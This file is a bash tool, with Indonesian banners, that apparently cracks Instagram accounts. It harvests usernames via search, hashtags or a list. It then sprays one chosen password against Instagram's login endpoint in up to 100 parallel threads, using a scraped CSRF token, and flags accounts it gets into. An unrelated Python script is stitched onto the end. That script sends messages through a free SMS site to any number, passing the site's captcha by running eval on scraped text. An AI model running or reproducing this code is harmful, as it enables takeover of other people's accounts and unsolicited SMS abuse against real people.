#!/bin/bash

red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'

limit=100
clear

echo -e $'''
\033[1;31m ┏━┓┏━┓      \033[1;36m┏┳┓┳ ┳┳ ┏┳┓┳  ┏┓ ┳━┓┳ ┳┏┳┓┳━┓
\033[1;31m ┃┏┗┛┓┃      \033[1;36m┃┃┃┃ ┃┃  ┃ ┃  ┣┻┓┣┳┛┃ ┃ ┃ ┃┫
\033[1;31m ┗┓▋▋┏┛      \033[1;36m┻ ┻┗━┛┻━┛┻ ┻  ┗━┛┻┗━┗━┛ ┻ ┻━┛
\033[1;31m┏━┻┓╲┗━━━━┓┏┓       \033[1;34m┳━┓┏━┓┏━┓┏━┓┳━┓  ┳ ┳━┓
\033[1;31m┃▎▎┃╲╲╲╲╲╲┣━┛       \033[1;34m┃┫ ┃ ┃┣┳┛┃  ┃┫   ┃ ┃ ┓
\033[1;31m┗━┳┻▅┛╲╲╲╲┃         \033[1;34m┻  ┗━┛┻┗━┗━┛┻━┛  ┻ ┗━┛
\033[1;31m  ┗━┳┓┏┳┓┏┛ \033[1;37mAuthor   \033[1;31m: \033[1;36mMr.004 Feat Hat_22
\033[1;31m    ┗┻┛┗┻┛  \033[1;37mEmail\033[1;31m: \033[1;35mindrapati8@gmail.com
            \033[1;37mYouTube  \033[1;31m: \033[1;31mGamer 4 LIve\e[1;37m
\033[1;31m╔╦══════════════════════════════════════╦╗
\033[1;31m╠╝ \033[1;33m● \033[1;37mGunakan Tools Ini Dengan Bijak Ya! Admin Ngga Tanggung Jawab\033[1;31m╚╣
\033[1;31m║   \033[1;37m Resikonya Kalian Tanggung Sendiri Asw\033[1;31m║
\033[1;31m╚════════════════════════════════════════╝
\033[1;32m------------------------------------------'''
clear
python2 meizu.py
clear
dependencies=( "jq" "curl" )
for i in "${dependencies[@]}"
do
    command -v $i >/dev/null 2>&1 || {
        echo >&2 "$i : not installed - install by typing the command : apt install $i -y"
        exit
    }
done


echo -e '''\033[1;32m------------------------------------------
\033[1;37m[\033[1;33m1\033[1;37m] \033[1;33mDapatkan Target Melalui \e[1;35m@username asw\e[1;37m
\033[1;37m[\033[1;33m2\033[1;37m] \033[1;33mDapatkan Target Melalui \e[1;35m#hashtag jangan hastag bokep asw\e[1;37m
\033[1;37m[\033[1;33m3\033[1;37m] \033[1;33mHack Akun Dari Daftar Target Saya.siapa kimi hime kan bisa?
'''

read -p $'\033[1;36m[\033[1;33m+\033[1;36m] Pilih \033[1;31m: \e[1;33m' novalattasya

touch target

case $novalattasya in
    1) 
        read -p $'\033[1;36m[\033[1;33m?\033[1;36m] Input username asw \033[1;31m: \e[1;33m' ask
        collect=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${ask}" | jq -r '.users[].user.username' > target)
        echo $'\e[37m[\e[34m+\e[37m] Jumlah Target : \e[1;33m'$collect''$(< target wc -l ; echo -e "${white}Target")
        read -p $'[\e[1;34m?\e[1;37m] Input Sandi   : \e[1;33m' pass
        echo -e "${white}[${yellow}!${white}] ${red}Bentar Asw Lagi Njebol ...${white}"
        ;;
    2) 
        read -p $'\e[37m[\e[34m?\e[37m] Input hastag: \e[1;33m' hashtag
        get=$(curl -sX GET "https://www.instagram.com/explore/tags/${hashtag}/?__a=1")
        if [[ $get =~ "Page Not Found" ]]; then
        echo -e "$hashtag : ${red}Hashtag not found${white}"
        exit
        else
            echo "$get" | jq -r '.[].hashtag.edge_hashtag_to_media.edges[].node.shortcode' | awk '{print "https://www.instagram.com/p/"$0"/"}' > result
            echo -e "${white}[${blue}!${white}] Menghapus Duplikat User Dari ${red}#$hashtag${white}"$(sort -u result > hashtag)
            echo -e "[${blue}+${white}] Jumlah Target : ${yellow}"$(< hashtag wc -l ; echo -e "${white}user")
            read -p $'[\e[34m?\e[37m] Input Sandi   : \e[1;33m' pass
            echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
            for tag in $(cat hashtag); do
                echo $tag | xargs -P 100 curl -s | grep -o "alternateName.*" | cut -d "@" -f2 | cut -d '"' -f1 >> target &
            done
            wait
            rm hashtag result
        fi
        ;;
    3) 
        read -p $'\e[37m[\e[34m?\e[37m] Input your list   : \e[1;33m' list
        if [[ ! -e $list ]]; then
            echo -e "${red}file not found${white}"
            exit
            else
                cat $list > target
                echo -e "[${blue}+${white}] Total your list   : ${yellow}"$(< target wc -l)
                read -p $'[\e[34m?\e[37m] Password to use   : \e[1;33m' pass
                echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
        fi
        ;;
    *) 
        echo -e "${white}Input Tidak Tersedia!"
        sleep 1
        clear
        bash ig.sh
esac


token=$(curl -sLi "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)
function brute(){
    url=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/ajax/" \
                    -H "cookie: csrftoken=${token}" \
                    -H "origin: https://www.instagram.com" \
                    -H "referer: https://www.instagram.com/accounts/login/" \
                    -H "user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36" \
                    -H "x-csrftoken: ${token}" \
                    -H "x-requested-with: XMLHttpRequest" \
                    -d "username=${i}&password=${pass}")
                    login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
                    if [[ $login =~ "true" ]]; then
                            echo -e "[${green}+${white}] ${yellow}You get it! ${blue}[${white}@$i - $pass${blue}] ${white}- with: "$(curl -s "https://www.instagram.com/$i/" | grep "<meta content=" | cut -d '"' -f2 | cut -d "," -f1)
                        elif [[ $login =~ "false" ]]; then
                                    echo -e "[${red}!${white}] @$i - ${red}failed to crack${white}"
                            elif [[ $url =~ "checkpoint_required" ]]; then
                                    echo -e "[${cyan}?${white}] @$i ${white}: ${green}checkpoint${white}"
                    fi
}


(
    for i in $(cat target); do
        ((thread=thread%limit)); ((thread++==0)) && wait
        brute "$i" &
    done
    wait
)

rm target

# Mr.004
# 00ErorSystem
from requests import Session
import re, sys
s = Session()

try:
	print("\n\n*SMS Gratis by Mr.004 - 004ErorSyestem Gwe Ngga Recode Babi Asw\n * Gunakan kode negara (ex: 628xxxxx)\n")
	no = int(input(" Nomor : "))
	msg = input(" Pesan : ")
except:
	print("\n\t* Cek nomermu atau pesanmu! *")
	sys.exit()

headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36',
    'Referer': 'http://sms.payuterus.biz/alpha/'
}

bypass = s.get("http://sms.payuterus.biz/alpha/?a=keluar", headers=headers).text
key = re.findall(r'value="(\d+)"', bypass)[0]
jml = re.findall(r'<span>(.*?) = </span>', bypass)[0]
captcha = eval(jml.replace("x", "*").replace(":", "/"))

data = {
	'nohp':no,
	'pesan':msg,
	'captcha':captcha,
	'key':key
}

send = s.post("http://sms.payuterus.biz/alpha/send.php", headers=headers, data=data).text

if 'SMS Gratis Telah Dikirim bilang apa asw ke mr.004' in send:
	print(f"\n  [ Pengiriman sukses ]\n  [ {no} : {msg} ]\n")
elif 'MAAF....!' in send:
	print("\n  [ Mohon tunggu ampe nickname lu modar  untuk mengirim pesan yg sama ]\n")
else:
	print("\n  [ Pengiriman gagal lu toxic anjay]\n")
